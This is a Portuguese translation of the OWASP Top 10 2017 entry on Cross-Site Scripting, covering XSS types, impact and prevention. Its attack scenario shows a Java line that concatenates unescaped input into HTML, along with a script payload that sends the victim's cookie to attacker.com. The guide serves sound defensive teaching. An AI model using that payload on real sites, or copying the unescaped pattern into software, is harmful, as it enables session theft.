# A7:2017 Cross-Site Scripting (XSS)

| Agentes de Ameaça/Vetores de Ataque | Vulnerabilidades de Segurança | Impactos |
| -- | -- | -- |
| Nível de Acesso \| Explorabilidade 3 | Prevalência 3 \| Detectabilidade 3 | Técnico 2 \| Negócio |
| Ferramentas automatizadas podem detectar e explorar as três formas de XSS, e existem frameworks de exploits disponíveis gratuitamente. | XSS é o segundo problema mais prevalente no OWASP Top 10, e é encontrado em cerca de dois terços de todas as aplicações. As ferramentas automatizadas podem encontrar alguns problemas XSS automaticamente, particularmente em tecnologias maduras, como PHP, J2EE / JSP e ASP.NET. | O impacto do XSS é moderado para refletido e DOM XSS, e grave para XSS armazenado, com execução remota de código no navegador da vítima, como roubar credenciais, sessões ou entregar malwares à vítima. |

## A Aplicação Está Vulnerável?

Existem três formas de XSS, geralmente visando os navegadores dos usuários:

* **XSS Refletido**: Sua aplicação ou API inclui entradas de usuário não validadas e não modificadas como parte da saída HTML. Um ataque bem sucedido pode permitir que o atacante execute HTML e JavaScript arbitrários no navegador da vítima. Normalmente, o usuário precisará interagir com algum link malicioso que aponte para uma página controlada pelo atacante, como sites maliciosos de *watering hole*, propagandas ou similares.
* **XSS Armazenado**: Sua aplicação ou API armazena entradas de usuário não sanitizadas que é vista mais tarde por outro usuário ou administrador. O XSS armazenado é frequentemente considerado de risco alto ou crítico.
* **DOM XSS**: Frameworks de JavaScript, aplicativos de uma única página (SPAs) e APIs que incluem dinamicamente dados controláveis pelo atacante para uma página são vulneráveis ao DOM XSS. Idealmente, sua aplicação não enviaria dados controláveis pelo atacante para APIs de JavaScript inseguras.

Ataques XSS típicos incluem o roubo de sessão, a aquisição de contas, *bypass* de MFA (MultiFactor Authentication), a substituição de nós DOM ou o desfiguramento (como os painéis de login de trojan), ataques contra o navegador do usuário, como downloads de software mal-intencionado, *key logging* e outros ataques do lado do cliente.

## Como Prevenir

Prevenir XSS requer a separação de dados não confiáveis do conteúdo ativo do navegador. Isso pode ser alcançado por:


* Use frameworks que automaticamente escapam o XSS por design, como os mais recentes Ruby on Rails, React JS. Aprenda as limitações de proteção XSS de cada framework e cuide adequadamente os casos de uso que não são cobertos.
* Usar frameworks que automaticamente sanitizam o XSS por design, como Ruby on Rails e React JS mais recentes. Aprenda as limitações de proteção XSS de cada framework e cuide adequadamente os casos de uso que não são cobertos.
* Sanitizar por *escape* dados de solicitação HTTP não confiáveis com base no contexto na saída HTML (corpo, atributo, JavaScript, CSS ou URL) irá resolver vulnerabilidades XSS refletidas e armazenadas. A [Folha de Dicas OWASP 'XSS Prevention'](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) contém detalhes sobre técnicas de *escape* de dados necessárias.
* Aplicar *enconding* sensível ao contexto ao modificar o documento do navegador no lado do cliente atua contra DOM XSS. Quando isso não puder ser evitado, técnicas de *escaping* sensíveis ao contexto semelhantes podem ser aplicadas às APIs do navegador, conforme descrito na Folha de Dicas OWASP 'DOM Based XSS Prevention'.
* Habilitar um [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) é um controle de mitigação de defesa profunda contra o XSS. É eficaz se não existem outras vulnerabilidades que permitiriam colocar códigos maliciosos através de arquivos locais (por exemplo, sobrescritas de *path traversal* ou bibliotecas vulneráveis em fontes permitidas).

## Examplo de Cenários de Ataque

**Cenário 1**: A aplicação usa dados não confiáveis na construção do seguinte fragmento HTML sem validação ou *escaping*:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
O atacante modifica o parâmetro 'CC' no navegador para:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

Este ataque faz com que a ID da sessão da vítima seja enviada para o site do invasor, permitindo que o invasor seqüestra a sessão atual do usuário.

**Nota**: Atacantes podem usar XSS para derrubar qualquer defesa CSRF automatizada que a aplicação possa empregar.

## Referências

### OWASP

* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)

### Externas

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/kb/issues/00200308_clientsidetemplateinjection)
